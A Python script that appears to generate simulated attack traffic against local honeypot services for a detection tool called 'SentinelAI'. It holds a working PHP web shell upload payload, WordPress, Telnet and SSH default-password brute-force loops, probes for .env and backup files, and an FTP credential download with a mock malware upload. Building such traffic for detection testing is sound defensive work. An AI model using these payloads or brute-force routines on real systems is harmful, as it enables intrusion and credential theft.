import socket
import time
import requests
import telnetlib
import ftplib
import paramiko

# Targets running locally
HOST = "127.0.0.1"
PORT_SSH = 2222
PORT_HTTP = 8080
PORT_FTP = 2121
PORT_TELNET = 2323

def simulate_http_attacks():
    print("\n--- Simulating HTTP Attacks ---")
    base_url = f"http://{HOST}:{PORT_HTTP}"
    
    # 1. Simple scans / Port probe
    try:
        requests.get(base_url, timeout=3)
        print("[HTTP] Sent baseline homepage request.")
    except Exception as e:
        print(f"[HTTP] Homepage connection failed: {e}")
        
    # 2. Directory scan / Traversal
    for path in ["/admin", "/phpmyadmin", "/.env", "/config.php.bak", "/backup.sql"]:
        try:
            r = requests.get(f"{base_url}{path}", timeout=3)
            print(f"[HTTP] Scanned: {path} -> Status Code: {r.status_code}")
        except Exception:
            pass
            
    # 3. Web Brute Force / WordPress Spraying
    print("[HTTP] Triggering WordPress authentication brute-force...")
    for idx, password in enumerate(["123456", "password", "admin123", "secret"]):
        try:
            requests.post(
                f"{base_url}/wp-login.php",
                data={"log": "admin", "pwd": password},
                timeout=3
            )
        except Exception:
            pass
            
    # 4. Malware Shell Upload
    print("[HTTP] Injecting remote command execution web shell payload...")
    try:
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        r = requests.post(f"{base_url}/upload", files=files, timeout=3)
        print(f"[HTTP] Web Shell uploaded status: {r.json()}")
    except Exception as e:
        print(f"[HTTP] File upload failed: {e}")

def simulate_telnet_attacks():
    print("\n--- Simulating Telnet Brute-Force ---")
    try:
        # Connect to Telnet socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((HOST, PORT_TELNET))
        
        # Read user banner
        time.sleep(0.5)
        s.recv(1024)
        
        # Send credential trials
        for user, pwd in [("admin", "admin"), ("root", "root"), ("cisco", "cisco")]:
            s.sendall(f"{user}\r\n".encode())
            time.sleep(0.5)
            s.recv(1024)
            s.sendall(f"{pwd}\r\n".encode())
            time.sleep(0.5)
            res = s.recv(1024).decode()
            if "Switch#" in res:
                print(f"[Telnet] Accepted username: '{user}', password: '{pwd}'")
                s.sendall(b"show version\r\n")
                time.sleep(0.5)
                print(f"[Telnet] command response: {s.recv(2048).decode()}")
                s.sendall(b"exit\r\n")
                break
        s.close()
    except Exception as e:
        print(f"[Telnet] Simulation error: {e}")

def simulate_ftp_attacks():
    print("\n--- Simulating FTP Exploit Vectors ---")
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT_FTP, timeout=3.0)
        print("[FTP] Socket established. Login attempts starting...")
        
        try:
            ftp.login("anonymous", "anonymous@domain.com")
            print("[FTP] Logged in successfully.")
            
            # Directory listing
            files = ftp.nlst()
            print(f"[FTP] Directory List: {files}")
            
            # File download
            try:
                ftp.retrbinary('RETR credentials.txt', open('decoy_download.txt', 'wb').write)
                print("[FTP] Downloaded credential decoy.")
            except Exception as e:
                print(f"[FTP] Download failed: {e}")
                
            # Malware upload
            try:
                with open("test_malware.exe", "wb") as mf:
                    mf.write(b"MZ\\x90\\x00\\x03\\x00\\x00\\x00SentinelAI_Mock_Binary")
                ftp.storbinary('STOR test_malware.exe', open('test_malware.exe', 'rb'))
                print("[FTP] Uploaded malicious test binary.")
            except Exception as e:
                print(f"[FTP] Upload failed: {e}")
                
            ftp.quit()
        except Exception as e:
            print(f"[FTP] Login failed: {e}")
    except Exception as e:
        print(f"[FTP] Connection failed: {e}")

def simulate_ssh_attacks():
    print("\n--- Simulating SSH Port Scanning and Exploit Probes ---")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for username, password in [("user", "pass"), ("root", "root")]:
        try:
            print(f"[SSH] Probing SSH login with {username}:{password}...")
            client.connect(HOST, port=PORT_SSH, username=username, password=password, timeout=3)
            print(f"[SSH] Successfully logged in using credentials {username}:{password}!")
            
            # Run commands
            stdin, stdout, stderr = client.exec_command("whoami")
            print(f"[SSH] whoami output: {stdout.read().decode().strip()}")
            
            stdin, stdout, stderr = client.exec_command("id")
            print(f"[SSH] id output: {stdout.read().decode().strip()}")
            
            client.close()
            break
        except paramiko.AuthenticationException:
            print("[SSH] Authentication rejected.")
        except Exception as e:
            print(f"[SSH] Connection failed: {e}")
            break

if __name__ == "__main__":
    print("==================================================")
    print("SentinelAI Attacker Simulation Traffic Generator")
    print("==================================================")
    
    # Run attack cycles
    simulate_http_attacks()
    simulate_ftp_attacks()
    simulate_telnet_attacks()
    simulate_ssh_attacks()
    
    print("\n[Simulator] Attack simulation cycle completed.")
